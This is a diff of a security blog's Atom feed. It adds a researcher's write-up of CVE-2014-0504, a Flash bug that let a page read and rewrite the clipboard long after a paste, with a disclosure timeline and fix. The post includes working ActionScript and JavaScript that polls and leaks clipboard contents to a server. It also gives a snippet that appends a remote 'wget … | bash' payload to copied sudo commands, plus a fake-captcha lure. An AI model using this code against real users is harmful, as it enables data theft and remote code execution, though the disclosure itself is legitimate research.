@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Flash | Defined Misbehaviour]]></title>
   <link href="http://blog.saynotolinux.com/blog/categories/flash/atom.xml" rel="self"/>
   <link href="http://blog.saynotolinux.com/"/>
-  <updated>2014-12-11T04:36:41-04:00</updated>
+  <updated>2015-08-02T15:31:41-07:00</updated>
   <id>http://blog.saynotolinux.com/</id>
   <author>
     <name><![CDATA[Jordan Milne]]></name>
@@ -14,9 +14,216 @@
 
   
   <entry>
+    <title type="html"><![CDATA[Leaking Clipboard Contents With Flash: Let's Explore User-Initiated Actions!]]></title>
+    <link href="http://blog.saynotolinux.com/blog/2015/08/02/pastejacking-abusing-flash-to-leak-and-manipulate-clipboad-contents/"/>
+    <updated>2015-08-02T15:44:46-07:00</updated>
+    <id>http://blog.saynotolinux.com/blog/2015/08/02/pastejacking-abusing-flash-to-leak-and-manipulate-clipboad-contents</id>
+    <content type="html"><![CDATA[<p>(NOTE: This article has been sitting in my drafts since May 2014. I am very lazy.)</p>
+
+<h2>TL;DR</h2>
+
+<p>Flash only allows read access to the clipboard in event handlers triggered by <code>paste</code> events. Flash wasn&rsquo;t checking if the clipboard contents had changed since entering the event handler, leading to information leakage. Due to quirks in Flash&rsquo;s implementation, an attacker could read from and write to the clipboard for hours after the user navigated away from page containing the SWF, even after closing the incognito window.</p>
+
+<p><a href="/images/posts/flash-clip/clipstealer.gif"><img class="center" src="/images/posts/flash-clip/clipstealer.gif"></a></p>
+
+<!--more-->
+
+
+<h2>Intro</h2>
+
+<p>All that messing around with Flash in my previous posts made me think that I should read more into Flash security. Even if you hate Flash as a user, it&rsquo;s deployed pretty much everywhere and it&rsquo;s valuable attack surface! It ended up paying off, after a couple days of testing and reading the docs, I was left with a new bug, <a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0504">CVE-2014-0504</a>:</p>
+
+<p>Let&rsquo;s go into the combination of issues and possibly surprising behaviour in Flash that allowed clipboard leaking.</p>
+
+<h2>User-initiated actions and clipboard access in Flash</h2>
+
+<p>This isn&rsquo;t the first time Flash has had issues with clipboard access. Back in the days of Flash 9, you could write to the clipboard with no interaction at all. <a href="http://news.bbc.co.uk/2/hi/technology/7567889.stm">That caused a few problems</a>, so when Flash 10 rolled around, <a href="http://www.adobe.com/devnet/flashplayer/articles/fplayer10_uia_requirements.html">Adobe added a few restrictions to clipboard functionality</a>:</p>
+
+<p>First, the new <code>Clipboard</code> API only allowed writing to the clipboard when inside certain event handlers (<code>mousedown</code>, <code>keydown</code>, <code>copy</code>, etc.)</p>
+
+<p>Second, that event handler had to have been triggered by user interaction, meaning that events triggered by <code>dispatchEvent</code> et al. cannot write to the clipboard.</p>
+
+<pre><code class="as3">element.addEventListener(MouseEvent.CLICK, function(event:Event):void {
+    Clipboard.generalClipboard.setData(ClipboardFormats.TEXT_FORMAT, "Yo dude!");
+});
+</code></pre>
+
+<p>Additionally, a method allowing you to <em>read</em> from the clipboard was added. This was restricted even more, and could only be called inside user-initiated <code>paste</code> events.</p>
+
+<pre><code class="as3">element.addEventListener(Event.PASTE, function(event:Event):void {
+    var contents = Clipboard.generalClipboard.getData(ClipboardFormats.TEXT_FORMAT);
+    //...snip
+});
+</code></pre>
+
+<h2>Overstaying our welcome</h2>
+
+<p>We&rsquo;ve established that to call <code>Clipboard.getData</code> we <em>must</em> be in a <code>paste</code> event handler, and that handler <em>must</em> have been triggered by the user. As far as I can tell, there&rsquo;s no way around that. Can we still abuse it?</p>
+
+<p>The obvious thing to check is if we can block inside the event handler. In many browsers, blocking in an event handler in Flash will cause a plugin hang, and a prompt to kill the plugin will spawn. Chrome, however, keeps right on trucking, even when Flash is executing something like <code>while(true){;}</code> <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. The UI and JavaScript all work as usual, a prompt to kill the plugin will only be displayed if the user opens another tab that uses Flash. Actually, our handler will continue to execute even when the tab containing our SWF is closed!</p>
+
+<h2>Enjoying the view</h2>
+
+<p>Given that we aren&rsquo;t really penalized for sitting around in a privileged event handler, there&rsquo;s nothing to stop us from just calling <code>Clipboard.getData()</code> in a loop and checking for changes. We can just get the user to paste something non-sensitive, then abuse our clipboard access to read sensitive information that gets added to it later.</p>
+
+<p>Here&rsquo;s a basic demonstration of the issue:</p>
+
+<pre><code class="as3">import flash.desktop.*;
+
+protected function init():void {
+    // Where jackTarget is a sprite that receives paste events
+    jackTarget.addEventListener(Event.PASTE, logClipboard);
+}
+
+protected function logClipboard(event:Event):void {
+    var lastCB:String = null;
+    while(true) {
+        // Try not to peg the CPU too much
+        __sleep(1000);
+        var newCB:String = Clipboard.generalClipboard.getData(ClipboardFormats.TEXT_FORMAT) as String;
+        if(newCB != lastCB) {
+            ExternalInterface.call("alert", newCB);
+        }
+    }
+}
+
+private static function __sleep(ms:int):void {
+    var target:Date = new Date();
+    target.time += ms;
+    while(new Date() &lt; target) { ; }
+}
+</code></pre>
+
+<h2>Roadblocks to real-world exploitability</h2>
+
+<h3>Getting the initial paste event</h3>
+
+<p>To trigger the exploit, we <em>need</em> to convince the victim to paste something into our SWF. There are a number of usage patterns we could abuse to do that, but I liked <a href="http://blog.kotowicz.net/2011/07/cross-domain-content-extraction-with.html">the fake captcha method</a> kkotowicz used for his cross-domain content extraction attack. We give the user a random string, and ask them to paste it into &ldquo;verification box&rdquo; (actually our SWF,) telling them it&rsquo;s required to prove they&rsquo;re not a bot:</p>
+
+<p><a href="/images/posts/flash-clip/usage-pattern.png"><img class="center" src="/images/posts/flash-clip/usage-pattern.png"></a></p>
+
+<h3>Flash&rsquo;s scriptTimeLimit</h3>
+
+<p><a href="http://help.adobe.com/en_US/flex/using/WS2db454920e96a9e51e63e3d11c0bf69084-7b09.html#WS2db454920e96a9e51e63e3d11c0bf67110-7ff6">Flash will not allow</a> a single event handler to run for longer than 60 seconds. A 60 second window for clipboard access is obviously not ideal for us.</p>
+
+<p>Luckily, the time limit is on <em>individual</em> event handlers, and <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/events/Event.html#PASTE">the paste event bubbles</a>. We can just give our paste target tons of parent elements that also handle <code>paste</code> events, and allow the event to bubble up before the handler gets killed, Then we can log the clipboard for <code>60~ seconds * \&lt;num of parents\&gt;</code>:</p>
+
+<pre><code class="as3">function wrapInListeners(what:Sprite, eventType:String, handler:Function):Sprite {
+    what.addEventListener(eventType, handler);
+    var highest:Sprite = what;
+
+    // Wrap the element in HBoxes that will handle the event when it bubbles up.
+    for(var i:int = 0; i &lt; 140; ++i) {
+        var hbox:HBox = new HBox();
+        hbox.addChild(highest);
+        hbox.addEventListener(eventType, handler);
+        highest = hbox;
+    }
+
+    return highest;
+}
+//...snip
+wrapInListeners(target, Event.PASTE, tempJackClipboard);
+</code></pre>
+
+<h3>Leaking clipboard contents to a remote server</h3>
+
+<p>Unfortunately, I couldn&rsquo;t find a way to make Flash send HTTP requests while inside the event handler. However, we can pass the data to JavaScript and have <em>it</em> send the data to our servers, since our ActionScript won&rsquo;t block JS:</p>
+
+<pre><code class="as3">ExternalInterface.call('leakData', Clipboard.generalClipboard.getData(...))
+</code></pre>
+
+<pre><code class="js">function leakData(data) {
+   (new Image()).src = "/leak?data=" + encodeURIComponent(data); 
+}
+</code></pre>
+
+<p>The <code>ExternalInterface</code> method has the caveat that it will longer work after we&rsquo;ve navigated away from the page or the tab was closed, even though our event handler will continue to run. As a fallback, we can use <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/Socket.html">Flash&rsquo;s TCP socket support</a>, which allows synchronous communication. Again, with a caveat that it only seems allow sending a single message while in the event handler <sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>:</p>
+
+<pre><code class="as3">// Initialization code...
+var leakSocket:Socket = new Socket();
+var url:String = loaderInfo.url;
+if(URLUtil.isHttpURL(url) || URLUtil.isHttpsURL(url)) {
+    // Set up socket comms with the server
+    leakSocket.connect(URLUtil.getServerName(url), 5190);
+}
+
+// Inside paste event handler...
+if(leakSocket.connected) {
+    leakSocket.writeUTFBytes(encoded);
+    // only seems to work once while within the handler
+    leakSocket.flush();
+}
+</code></pre>
+
+<h2>Going the extra mile</h2>
+
+<p>So we can leak the clipboard remotely even after navigating away. That&rsquo;s neat, but we can actually do a lot more! Remember how Flash allows us to <em>write</em> to the clipboard in certain handlers as well? That lets us do all sorts of sneaky things, like detect when someone copies what looks like HTML, and then modify it to include a malware script. Even better, we can detect clipboard contents that look like commands and slip our own payload into them!</p>
+
+<pre><code class="as3">var PAYLOAD_START:String = 'echo -e "\\x1B[A\\x1B[J\\$ you could use more complex vt100 codes to scrub this properly but eh";';
+// The trailing newline will make it execute immediately after pasting in many shells, not giving them time to inspect the command
+// see https://cirw.in/blog/bracketed-paste
+var PAYLOAD_END:String = ';wget "http://saynotolinux.com/bash_payload.txt" -O - 2&gt;/dev/null | bash;\n';
+// snip...
+
+var cbContents:String = Clipboard.generalClipboard.getData(ClipboardFormats.TEXT_FORMAT) as String;
+// This looks like an interesting command to hijack, the user will be expecting to enter their sudo password,
+// and they won't need to enter a password for our payload if we run it afterwards.
+if (cbContents.match(/^sudo /)) {
+    Clipboard.generalClipboard.setData(ClipboardFormats.TEXT_FORMAT, PAYLOAD_START + cbContents + PAYLOAD_END);
+}
+</code></pre>
+
+<h2>PoC</h2>
+
+<p>The code for a <a href="https://gist.github.com/JordanMilne/7ad2dc114ad0eab5fa7b">full PoC is here</a>, and a <a href="http://saynotolinux.com/tests/flash_clip/persist_jack.html">live version without the echo server is also up here</a>.</p>
+
+<h2>The Fix</h2>
+
+<p>The initial fix was to <a href="https://code.google.com/p/chromium/issues/detail?id=333094#c15">expose a sequence number to Flash</a> so it could tell if the clipboard state had changed since the initial event was raised, and block access to the clipboard. That stayed in place for a while, but some time after that it was replaced with a change that blocked clipboard reads 10 seconds after the event was raised. If I had to guess why, some application probably relied on being able to do multiple clipboard reads and writes in the same event handler.</p>
+
+<p>Being able to read the clipboard 10 seconds after the initial paste event still seems a bit much, but it&rsquo;s definitely better than how it was before.</p>
+
+<h2>The Take-Away</h2>
+
+<ul>
+<li>Flash event handlers may continue to execute up to <em>two hours</em> after starting, even after closing incognito windows!</li>
+<li>Flash&rsquo;s <code>Socket</code> class is useful something other than <a href="https://superuser.com/questions/313230/use-a-socks5-proxy-in-flash-player">bypassing the user&rsquo;s proxy</a>!</li>
+<li>Flash still has low-hanging fruit to be picked, and its stdlib is absolutely enormous. There aren&rsquo;t many eyeballs on it either, you&rsquo;re only really competing against Masato Kinugawa :)</li>
+</ul>
+
+
+<h2>Disclosure Timeline</h2>
+
+<ul>
+<li>2014-01-06: Disovered the bug</li>
+<li>2014-01-09: Reported to Google&rsquo;s sec team due to it mostly affecting PPAPI Flash</li>
+<li>2014-01-09: Bug confirmed by Google&rsquo;s security team</li>
+<li>2014-01-13: Bug confirmed by Adobe&rsquo;s security team</li>
+<li>2014-01-29: Google ships code exposing the clipboard sequence num to Flash via PPAPI</li>
+<li>2014-03-14: Adobe ships a fix to use Chrome&rsquo;s clipboard sequence number</li>
+<li>???: Flash switches to allowing clipboard reads for 10 seconds after the event is raised</li>
+</ul>
+
+
+<h2>Footnotes</h2>
+<div class="footnotes">
+<hr/>
+<ol>
+<li id="fn:1">
+<p>Firefox on Linux demonstrates similar behaviour, but allows Flash&rsquo;s event handlers to continue executing <em>even after the browser has closed</em>.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
+<li id="fn:2">
+<p>Again, Firefox on Linux behaves differently. You can send / receive as much as you want, even after the browser has closed. It&rsquo;s possible that Chrome&rsquo;s behaviour is a bug.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
+</ol>
+</div>
+
+]]></content>
+  </entry>
+  
+  <entry>
     <title type="html"><![CDATA[Seizing Control of Yahoo! Mail Cross-Origin... Again]]></title>
     <link href="http://blog.saynotolinux.com/blog/2014/12/09/seizing-control-of-yahoo-mail-cross-origin-again/"/>
-    <updated>2014-12-09T07:56:01-04:00</updated>
+    <updated>2014-12-09T03:56:01-08:00</updated>
     <id>http://blog.saynotolinux.com/blog/2014/12/09/seizing-control-of-yahoo-mail-cross-origin-again</id>
     <content type="html"><![CDATA[<p><em>This is a follow-up to another article about crossorigin mail theft on Yahoo! Mail using Flash. For a better understanding of the issue, you can read that here: <a href="http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/">http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/</a></em></p>
 
@@ -390,9 +597,9 @@
   
   <entry>
     <title type="html"><![CDATA[Yahoo's Pet Show of Horrors: Leaking a User's Emails Crossdomain]]></title>
-    <link href="http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/"/>
-    <updated>2014-03-01T01:12:17-04:00</updated>
-    <id>http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email</id>
+    <link href="http://blog.saynotolinux.com/blog/2014/02/28/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/"/>
+    <updated>2014-02-28T21:12:17-08:00</updated>
+    <id>http://blog.saynotolinux.com/blog/2014/02/28/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email</id>
     <content type="html"><![CDATA[<p>I&rsquo;m taking a break from browser security posts while I wait for vendors to patch, so the next few posts are probably going to be about web app security. Hopefully I should have some posts about architectural flaws in browsers / plugins by next month.</p>
 
 <h2>Initial Discovery</h2>
